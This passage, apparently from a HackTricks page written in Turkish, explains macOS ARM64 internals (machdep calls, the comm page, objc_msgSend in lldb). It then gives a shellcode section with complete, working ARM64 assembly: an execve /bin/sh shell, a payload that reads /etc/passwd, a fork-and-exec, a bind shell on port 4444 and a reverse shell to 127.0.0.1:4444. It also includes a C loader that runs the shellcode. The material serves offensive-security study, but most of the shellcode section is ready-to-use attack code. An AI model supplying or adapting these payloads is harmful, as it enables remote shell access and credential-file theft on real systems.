> Bazen **decompiled** kodu **`libsystem_kernel.dylib`**'den kontrol etmek, **source code**'u kontrol etmekten daha kolay olabilir; çünkü birkaç **syscalls** (BSD ve Mach) script'ler aracılığıyla üretilir (source code içindeki yorumlara bakın), oysa **dylib**'de hangi şeyin çağrıldığını bulabilirsiniz.

### machdep calls

XNU, machine dependent olarak adlandırılan başka bir tür çağrıyı destekler. Bu çağrıların numaraları mimariye bağlıdır ve ne çağrıların kendileri ne de numaraların sabit kalacağı garanti edilmez.

### comm page

Bu, kernel'e ait bir bellek sayfasıdır ve her kullanıcının sürecinin adres uzayına maplenir. Kullanıcı modundan kernel alanına geçişi, çok sık kullanılan kernel servisleri için **syscalls** kullanmaktansa daha hızlı yapmak amacıyla tasarlanmıştır; aksi halde bu geçiş çok verimsiz olurdu.

Örneğin `gettimeofdate` çağrısı `timeval` değerini doğrudan comm page'den okur.

### objc_msgSend

Objective-C veya Swift programlarında bu fonksiyonun kullanıldığını görmek çok yaygındır. Bu fonksiyon, bir Objective-C nesnesinin metodunu çağırmaya olanak tanır.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Pointer to the instance
- x1: op -> Selector of the method
- x2... -> Rest of the arguments of the invoked method

Bu yüzden, bu fonksiyona dallanmadan önce bir breakpoint koyarsanız, lldb'de neyin çağrıldığını kolayca bulabilirsiniz (bu örnekte nesne `NSConcreteTask` içinden bir nesneyi çağırır ve bu bir komut çalıştıracaktır):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Ortam değişkeni **`NSObjCMessageLoggingEnabled=1`** olarak ayarlandığında, bu fonksiyon çağrıldığında `/tmp/msgSends-pid` gibi bir dosyaya log tutulmasını sağlayabilirsiniz.
>
> Ayrıca, **`OBJC_HELP=1`** ayarlandığında ve herhangi bir binary çağrıldığında, belirli Objc-C eylemleri gerçekleştiğinde **log** tutmak için kullanabileceğiniz diğer ortam değişkenlerini görebilirsiniz.

Bu fonksiyon çağrıldığında, belirtilen örneğin çağrılan method'unu bulmak gerekir; bunun için farklı aramalar yapılır:

- Optimistic cache lookup gerçekleştirilir:
- Başarılıysa, tamam
- runtimeLock (read) edinilir
- Eğer (realize && !cls->realized) ise sınıf realize edilir
- Eğer (initialize && !cls->initialized) ise sınıf initialize edilir
- Sınıfın kendi cache'i denenir:
- Başarılıysa, tamam
- Sınıfın method listesi denenir:
- Bulunursa, cache doldurulur ve tamam
- Üst sınıfın cache'i denenir:
- Başarılıysa, tamam
- Üst sınıfın method listesi denenir:
- Bulunursa, cache doldurulur ve tamam
- Eğer (resolver) ise method resolver denenir ve class lookup'tan tekrarlanır
- Hâlâ buradaysa (= diğer her şey başarısız oldu) forwarder denenir

### Shellcodes

Derlemek için:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Baytları çıkarmak için:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Daha yeni macOS için:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Shellcode'u test etmek için C kodu</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Bu [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) kaynağından alınmıştır ve açıklanmıştır.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### cat ile okuma

Amaç `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` çalıştırmaktır, bu yüzden ikinci argüman (x1) bir parametreler dizisidir (bellekte bunun anlamı adreslerin bir yığınıdır).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Ana süreç sonlandırılmasın diye fork'tan sh ile komutu çalıştırın
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell, [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) adresinden, **port 4444**'te
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Kaynak: [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell **127.0.0.1:4444**'e
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
